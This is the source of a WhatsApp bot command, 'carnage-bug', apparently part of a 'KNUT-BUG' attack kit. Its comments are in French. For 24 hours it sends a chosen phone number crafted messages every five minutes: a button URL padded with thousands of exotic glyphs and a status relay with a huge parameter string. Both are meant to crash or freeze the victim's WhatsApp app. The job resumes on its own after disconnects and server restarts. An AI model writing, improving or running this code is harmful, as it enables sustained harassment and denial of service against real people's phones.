// ./commands/carnage-bug.js

// Liste blanche des numeros proteges — tableau WHITELIST_NUMBERS dans js/config.js
import { isWhitelisted, WHITELIST_BLOCKED_MESSAGE } from "../js/config.js";


import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "carnage-bug",
  description: "Lance Caranage-Bug sur un numéro",

  // Commande LONGUE : le serveur la confie au moteur de jobs (js/jobs.js) et
  // REPOND IMMEDIATEMENT au navigateur. Le job continue en arriere-plan pendant
  // toute sa duree, meme onglet ferme, et reprend apres un redemarrage serveur.
  background: true,

  async execute(context) {
    const { from, msg, args } = context;

    // Socket "vivante" : en 24h le bot se deconnecte/reconnecte plusieurs fois.
    // On relit la socket courante a chaque action au lieu d'une reference morte.
    const sock = () => context.sock;

    const targetNumber = args?.[0] || "";

    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      await sock()?.sendMessage(from, { text: "> KNUT-BUG\n> Numéro manquant" }, opts);
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      await sock()?.sendMessage(from, { text: "> KNUT-BUG\n> Numéro invalide" }, opts);
      return { success: false, message: "Numéro invalide" };
    }

    // ---- LISTE BLANCHE (couche 3, dernier rempart avant l'envoi) ----
    if (isWhitelisted(number) || isWhitelisted(targetNumber)) {
      return { success: false, blocked: true, message: WHITELIST_BLOCKED_MESSAGE };
    }

    const target = number + "@s.whatsapp.net";

    try {
      // Initiation — envoyee UNE SEULE fois (pas a chaque reprise apres redemarrage)
      if (!context.state?.sent) await sock()?.sendMessage(
        from,
        {
          image: { url: "https://files.catbox.moe/xfhezd.jpg" },
          caption: `> KNUT-BUG - CARNAGE\n\n> Cible : ${number}\n> Durée : 24h`
        },
        opts
      );

      // Paramètres
      const START = context.startedAt || Date.now();
      const DURATION = context.durationMs || 24 * 60 * 60 * 1000; // 24 heures
      const ACTION_INTERVAL = 5 * 60 * 1000;     // 5 minutes
      const MAX_PER_HOUR = 12; // 12 par heures

      // Echeance ABSOLUE fournie par le moteur de jobs : apres un redemarrage du
      // serveur on reprend sur le TEMPS RESTANT (pas DURATION de plus).
      const DEADLINE = context.deadline || START + DURATION;

      // Compteurs restaures depuis la table bot_jobs (reprise apres redeploy).
      let sent = context.state?.sent || 0;
      let hourCount = context.state?.hourCount || 0;
      let hourStart = context.state?.hourStart || Date.now();

      // ========================
      //   FONCTIONS
      // ========================

      async function delaynih(prim, target) {
        if (!prim || !target) return;

        // UN SEUL envoi par appel : c'est la BOUCLE PRINCIPALE (plus bas) qui
        // cadence le job (12/heure, toutes les 5 min, pendant 24h).
        // L'ancien `while (true)` ne rendait JAMAIS la main => le job ne pouvait
        // ni respecter sa duree de 24h, ni etre arrete par le bouton Stop.
        {
          const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  nativeFlowResponseMessage: {
                    version: 3,
                    name: "galaxy_message",
                    paramsJson: "".repeat(1045000)
                  },
                  contextInfo: {
                    entryPointConversionSource: "call_permission_request"
                  },
                  body: { 
                    format: "DEFAULT",
                    text: "THIS IS - PRIMIS" 
                  }
                }
              }
            }
          }, {
            messageTimestamp: (Date.now() / 1000) | 0,
            userJid: target,
            messageId: undefined
          });

          await prim.relayMessage("status@broadcast", msg.message, {
            additionalNodes: [{
              tag: "meta",
              attrs: {},
              content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }]
            }],
            messageId: msg.key?.id || undefined,
            statusJidList: [target]
          }, { 
            participant: target 
          });
        }
      }

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY", 
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com" 
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      // ========================
      //   BOUCLE PRINCIPALE
      // ========================

      while (Date.now() < DEADLINE) {
        // Bouton "Stop" du site (ou arret du serveur) -> sortie propre.
        if (context.isCancelled?.()) break;

        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        // Bot deconnecte ? On PATIENTE : il se reconnecte tout seul et le job
        // repart. Un job de 24h ne doit JAMAIS mourir d'une coupure de reseau.
        const live = await context.waitForSocket?.();
        if (!live) break;

        if (hourCount < MAX_PER_HOUR) {
          // try/catch PAR ACTION : un echec ponctuel (reseau, socket morte, 429)
          // n'interrompt plus les 24h comme le faisait le seul catch global.
          try {
            await crashnotif(live, target);
            await delaynih(live, target);
            hourCount++;
            sent++;
          } catch (actionError) {
            console.error("⚠️ carnage-bug action ratee (" + number + ") :", actionError?.message || actionError);
            context.onStatus?.("Action ratée — nouvelle tentative dans 5 min");
          }
        }

        // Progression -> Socket.IO + table bot_jobs (visible meme onglet ferme)
        context.onProgress?.({ sent, hourCount, hourStart });

        // Sommeil ANNULABLE : le bouton Stop agit immediatement, pas dans 5 min.
        await (context.sleep
          ? context.sleep(ACTION_INTERVAL)
          : new Promise(r => setTimeout(r, ACTION_INTERVAL)));
      }

      // Fin — le message distingue "termine" et "arrete par l'utilisateur"
      const cancelled = !!context.isCancelled?.();
      await sock()?.sendMessage(
        from,
        {
          text: cancelled
            ? `> KNUT-BUG\n> CARNAGE arrêté\n> ${sent} action(s) envoyée(s)`
            : `> KNUT-BUG\n> CARNAGE terminé\n> Durée : 24h\n> ${sent} action(s) envoyée(s)`
        },
        opts
      );

      return {
        success: true,
        cancelled,
        message: cancelled
          ? `Carnage-Bug arrêté sur ${number}`
          : `Carnage-Bug terminé sur ${number}`
      };

    } catch (error) {
      console.error("❌ Erreur carnage-bug :", error);

      await sock()?.sendMessage(
        from,
        { text: "> KNUT-BUG\n> Carnage interrompu" },
        opts
      );

      return { success: false, message: "Carnage interrompu" };
    }
  }
};